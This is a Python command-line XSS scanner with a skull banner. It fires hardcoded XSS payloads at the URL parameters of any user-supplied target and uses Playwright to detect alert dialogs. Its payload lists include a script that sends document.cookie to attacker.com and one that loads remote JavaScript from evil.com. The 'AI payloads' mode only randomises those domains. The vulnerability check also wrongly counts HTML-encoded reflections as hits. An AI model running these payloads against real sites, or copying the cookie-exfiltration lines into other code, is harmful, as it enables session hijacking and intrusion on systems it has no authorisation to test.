import asyncio
import httpx
from urllib.parse import urlparse, urlencode
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.progress import Progress, SpinnerColumn, TextColumn
from lxml import html
from bs4 import BeautifulSoup
from playwright.async_api import async_playwright
import random
import string
import re
import time

console = Console()

tool_banner = """[bold red]
███████████████████████████
███████▀▀▀░░░░░░░▀▀▀███████
████▀░░░░░░░░░░░░░░░░░▀████
███│░░░░░░░░░░░░░░░░░░░│███
██▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░░░▄███████
██████████▄▄▄▄▄▄▄██████████
███████████████████████████
"""

description = """[blue]
[1] Reflected XSSㅤ: Test Input-Based Reflections
[2] DOM Based XSSㅤ: Detect Risky JS Patterns
[3] Custom Payload : Use Custom Payload
[4] AI Payloads : Use Smart AI-Generated Payloads
[5] Dynamic Test : Run Full Dynamic Scan With Playwright
[0] Exit , Close Tools ⚙ 
"""

menu = """
[*] Select Optionㅤ:
[1] Reflected XSS SCAN
[2] DOM Based XSS SCAN
[3] Custom Payload TEST
[4] AI-Generated Payloads SCAN
[5] Dynamic Playwright SCAN
[0] Exit 
"""

# Payload sets, from weak to strong, plus smart AI-style templates:
basic_payloads = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "';alert(1);//",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<iframe src=javascript:alert(1)>"
]

# AI-style payload templates (simulate dynamic generation)
ai_payload_templates = [
    "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
    "<svg/onload=fetch('https://attacker.com/'+document.domain)>",
    "<img src=x onerror=eval('alert(1)')>",
    "';let x=document.createElement('script');x.src='https://evil.com/xss.js';document.body.appendChild(x);//",
    "<body onload=location='javascript:alert(1)'>",
]

# DOM XSS signatures to scan for
dom_signatures = [
    'document.write', 'innerHTML', 'location.hash', 'eval(',
    'setTimeout(', 'document.URL', 'document.location', 'window.name'
]

# Helper: generate random string (for payload evasion)
def random_string(length=6):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for _ in range(length))

# Helper: check if XSS triggered by searching raw or encoded payload
def is_xss_triggered(response_text, payload):
    encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
    return payload in response_text or encoded in response_text

# Helper: detect basic WAF presence (by common WAF blocks in headers or body)
def detect_waf(response):
    waf_signs = [
        'cloudflare', 'sucuri', 'incapsula', 'akamai', 'waf', 'mod_security',
        'denied', 'blocked', 'forbidden', 'access denied'
    ]
    headers = " ".join(f"{k}:{v}".lower() for k, v in response.headers.items())
    body = response.text.lower()
    for sign in waf_signs:
        if sign in headers or sign in body:
            return True
    return False

# Reflected XSS scan function (async, uses httpx for concurrency)
async def scan_reflected_xss(client, base_url, payloads, concurrency=10):
    parsed = urlparse(base_url)
    query = parsed.query
    if "=" not in query:
        console.print("[ERROR] No Parameters OF Test!", style="red")
        return

    base = base_url.split("?")[0]
    params = dict(kv.split("=", 1) for kv in query.split("&"))

    results = []
    sem = asyncio.Semaphore(concurrency)

    async def test_payload(payload):
        async with sem:
            injected = {k: payload for k in params}
            full_url = base + "?" + urlencode(injected)
            try:
                r = await client.get(full_url, timeout=10)
                if detect_waf(r):
                    console.print(f"[WAF Detected] {full_url}", style="red")
                if is_xss_triggered(r.text, payload):
                    console.print(f"[VULNERABLE] {full_url}", style="green")
                    results.append(full_url)
                else:
                    console.print(f"[SAFE] Payload: {payload}", style="red")
            except Exception as e:
                console.print(f"[ERROR] {str(e)}", style="red")

    tasks = [test_payload(p) for p in payloads]
    await asyncio.gather(*tasks)
    return results

# DOM Based XSS detection
async def scan_dom_xss(client, base_url):
    try:
        r = await client.get(base_url, timeout=10)
        found = [sig for sig in dom_signatures if sig in r.text]
        if found:
            console.print(f"[POSSIBLE DOM XSS] {', '.join(found)}", style="green")
        else:
            console.print("[SAFE] No DOM XSS Patterns Found!", style="red")
    except Exception as e:
        console.print(f"[ERROR] {str(e)}", style="red")

# Custom Payload test
async def test_custom_payload(client, base_url):
    payload = Prompt.ask("Enter Your Payload")
    parsed = urlparse(base_url)
    query = parsed.query

    if "=" not in query:
        console.print("No Parameters Found!", style="red")
        return

    base = base_url.split("?")[0]
    params = dict(kv.split("=", 1) for kv in query.split("&"))
    injected = {k: payload for k in params}
    full_url = base + "?" + urlencode(injected)
    try:
        r = await client.get(full_url, timeout=10)
        if is_xss_triggered(r.text, payload):
            console.print(f"[VULNERABLE] {full_url}", style="green")
        else:
            console.print(f"[SAFE] Payload: {payload}", style="red")
    except Exception as e:
        console.print(f"[ERROR] {str(e)}", style="red")

# AI-Generated Payload scan (rotate and add small randomization)
async def scan_ai_payloads(client, base_url):
    mutated_payloads = []
    for template in ai_payload_templates:
        rand_str = random_string()
        mutated = template.replace("attacker.com", f"attacker-{rand_str}.com")
        mutated_payloads.append(mutated)
    await scan_reflected_xss(client, base_url, mutated_payloads)

# Dynamic Playwright scan: inject payloads, detect runtime XSS execution (alert simulation)
async def scan_dynamic_xss(url, payloads):
    console.print("Starting dynamic scan with Playwright...", style="red")
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()

        parsed = urlparse(url)
        query = parsed.query
        if "=" not in query:
            console.print("No parameters to test", style="red")
            await browser.close()
            return

        base = url.split("?")[0]
        params = dict(kv.split("=", 1) for kv in query.split("&"))

        results = []

        for payload in payloads:
            injected = {k: payload for k in params}
            full_url = base + "?" + urlencode(injected)
            try:
                # Listen for alert dialogs (simulate detection of XSS)
                alert_triggered = False

                async def on_dialog(dialog):
                    nonlocal alert_triggered
                    alert_triggered = True
                    await dialog.dismiss()

                page.on("dialog", on_dialog)
                await page.goto(full_url, timeout=15000)
                await asyncio.sleep(2)  # wait JS to run

                if alert_triggered:
                    console.print(f"[VULNERABLE] {full_url}", style="green")
                    results.append(full_url)
                else:
                    console.print(f"[SAFE] Payload: {payload}", style="red")
            except Exception as e:
                console.print(f"[ERROR] {str(e)}", style="red")

        await browser.close()
        return results

async def main_async():
    console.print(tool_banner)
    console.print(Panel(description.strip(), style="blue", width=70))
    url = Prompt.ask("Enter Target URLㅤ")
    console.print(menu)
    choice = Prompt.ask("Choose Option ,", choices=["1", "2", "3", "4", "5", "0"], default="1")

    async with httpx.AsyncClient() as client:
        if choice == "1":
            await scan_reflected_xss(client, url, basic_payloads)
        elif choice == "2":
            await scan_dom_xss(client, url)
        elif choice == "3":
            await test_custom_payload(client, url)
        elif choice == "4":
            await scan_ai_payloads(client, url)
        elif choice == "5":
            await scan_dynamic_xss(url, basic_payloads + ai_payload_templates)
        elif choice == "0":
            console.print("Exited", style="red")
            return
    console.print("SCAN Comple Tes", style="green")

def main():
    asyncio.run(main_async())

if __name__ == "__main__":
    main()
